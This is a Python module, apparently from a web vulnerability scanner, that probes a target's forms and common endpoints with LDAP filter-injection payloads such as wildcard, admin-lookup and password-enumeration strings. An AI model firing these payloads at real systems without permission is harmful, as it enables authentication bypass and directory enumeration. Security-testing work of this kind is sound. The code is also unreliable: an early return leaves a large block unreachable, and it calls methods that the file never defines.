from core.scanner_imports import *
from core.base_scanner import BaseScanner
from core.utils import RequestUtils
from typing import Dict, List, Optional
import logging
from urllib.parse import urljoin
import re

class LDAPInjectionScanner(BaseScanner):
    def __init__(self, target_url: str, config: Dict):
        super().__init__(target_url, config)
        # More aggressive payloads
        self.payloads = [
            "*",                           # Basic wildcard
            "*)",                          # Closing parenthesis
            "*(",                          # Opening parenthesis
            "*)(cn=*)",                    # Common pattern
            "*)(uid=*",                    # UID search
            "*)(|(uid=*))",                # OR condition
            "*)(cn=admin)(cn=*",           # Admin search
            "*)(uid=admin)(uid=*)",        # Admin injection
            "admin*",                      # Admin prefix
            "*)(&)",                       # AND condition
            "*)(|(password=*))",           # Password enumeration
            "*()|&'",                      # Filter breaking
            "*/*",                         # Path traversal
            "admin*))%00",                 # Null byte
            ")(cn=*)))\x00",              # Binary null
            "*)(|(objectClass=*))",        # Object enumeration
            "*)(department=*)"             # Department enumeration
        ]

    def scan(self) -> Dict:
        try:
            tasks = []
            response = self.make_request(self.target_url)
            
            if not response:
                return {'ldap_injection': []}

            # Scan login forms
            forms = self.extract_forms(response.text)
            for form in forms:
                for input_field in form.get('inputs', []):
                    if input_field.get('type') in ['text', 'password']:
                        tasks.append({
                            'url': form.get('action', self.target_url),
                            'method': form.get('method', 'POST'),
                            'parameter': input_field.get('name', ''),
                            'type': 'form'
                        })

            # Test common LDAP endpoints
            endpoints = ['/login', '/auth', '/ldap', '/search']
            for endpoint in endpoints:
                url = f"{self.target_url.rstrip('/')}{endpoint}"
                tasks.append({
                    'url': url,
                    'method': 'GET',
                    'parameter': 'username',
                    'type': 'endpoint'
                })

            results = self.run_concurrent_tasks(tasks)
            return {'ldap_injection': [r for r in results if r]}
            results = []
            
            # Test all forms regardless of endpoint
            response = self.make_request(self.target_url)
            if response:
                forms = RequestUtils.extract_forms(response.text)
                for form in forms:
                    form_url = urljoin(self.target_url, form['action'] or self.target_url)
                    for input_field in form['inputs']:
                        if input_field['type'] in ['text', 'password', 'search']:
                            for payload in self.payloads:
                                test_result = self.test_ldap_injection(
                                    form_url,
                                    form['method'],
                                    input_field['name'],
                                    payload
                                )
                                if test_result:
                                    results.append({
                                        'url': form_url,
                                        'method': form['method'],
                                        'parameter': input_field['name'],
                                        'payload': payload,
                                        'type': 'LDAP Injection',
                                        'severity': 'High',
                                        'evidence': test_result
                                    })

            # Test common endpoints
            test_endpoints = [
                '/ldap', '/login', '/auth', '/search', '/user', '/admin',
                '/directory', '/profile', '/account', '/', '/api/users'
            ]

            for endpoint in test_endpoints:
                endpoint_url = urljoin(self.target_url, endpoint)
                for param in ['username', 'user', 'query', 'q', 'search', 'id', 'uid']:
                    for payload in self.payloads:
                        test_result = self.test_ldap_injection(
                            endpoint_url,
                            'GET',
                            param,
                            payload
                        )
                        if test_result:
                            results.append({
                                'url': endpoint_url,
                                'method': 'GET',
                                'parameter': param,
                                'payload': payload,
                                'type': 'LDAP Injection',
                                'severity': 'High',
                                'evidence': test_result
                            })

            return {'ldap_injection': results}

        except Exception as e:
            logging.error(f"LDAP Injection scanner error: {e}")
            return {'ldap_injection': [], 'error': str(e)}

    def execute_task(self, task: Dict) -> Optional[Dict]:
        try:
            # Make baseline request
            normal_response = self.make_request(
                task['url'],
                method=task['method'],
                data={task['parameter']: 'normal_user'} if task['method'] == 'POST' else None,
                params={task['parameter']: 'normal_user'} if task['method'] == 'GET' else None
            )

            if not normal_response:
                return None

            # Test with payloads
            for payload in self.payloads:
                try:
                    response = self.make_request(
                        task['url'],
                        method=task['method'],
                        data={task['parameter']: payload} if task['method'] == 'POST' else None,
                        params={task['parameter']: payload} if task['method'] == 'GET' else None
                    )

                    if response and self.is_vulnerable(response):
                        return {
                            'type': 'LDAP Injection',
                            'url': task['url'],
                            'parameter': task['parameter'],
                            'payload': payload,
                            'severity': 'High',
                            'evidence': 'LDAP injection pattern detected'
                        }

                except Exception as e:
                    logging.debug(f"Error testing payload {payload}: {e}")
                    continue

            return None

        except Exception as e:
            logging.error(f"Error in LDAP injection task: {e}")
            return None

    def detect_ldap_injection(self, normal_response, payload_response) -> bool:
        # Different response length
        if abs(len(normal_response.text) - len(payload_response.text)) > 50:
            return True

        # Different status code
        if normal_response.status_code != payload_response.status_code:
            return True

        # Check for LDAP-specific errors
        ldap_errors = [
            'ldap_',
            'invalid filter',
            'search filter',
            'invalid DN syntax',
            'directory service error'
        ]

        return any(error in payload_response.text.lower() 
                  and error not in normal_response.text.lower() 
                  for error in ldap_errors)

    def extract_forms(self, html: str) -> List[Dict]:
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                inputs = []
                for input_field in form.find_all(['input', 'textarea']):
                    inputs.append({
                        'name': input_field.get('name', ''),
                        'type': input_field.get('type', 'text')
                    })
                
                forms.append({
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').upper(),
                    'inputs': inputs
                })
            
            return forms
        except Exception as e:
            logging.error(f"Error extracting forms: {e}")

    def extract_url_parameters(self, url: str) -> List[str]:
        try:
            from urllib.parse import urlparse, parse_qs
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            return list(params.keys())
        except Exception as e:
            logging.error(f"Error extracting URL parameters: {e}")
            return []
